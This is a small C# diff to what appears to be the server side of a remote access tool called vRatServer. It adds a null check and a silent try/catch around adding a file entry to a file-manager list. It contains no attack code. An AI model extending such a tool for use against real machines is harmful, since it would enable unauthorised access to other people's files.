@@ -116,7 +116,14 @@ namespace vRatServer.Packets
             }
 
             Program.f1.Invoke((MethodInvoker)delegate {
-                client.fmf.FilesList.Items.Add(nfile);
+                if (client.fmf != null)
+                {
+                    try
+                    {
+                        client.fmf.FilesList.Items.Add(nfile);
+                    }
+                    catch (Exception) { }
+                }
 
             });
 
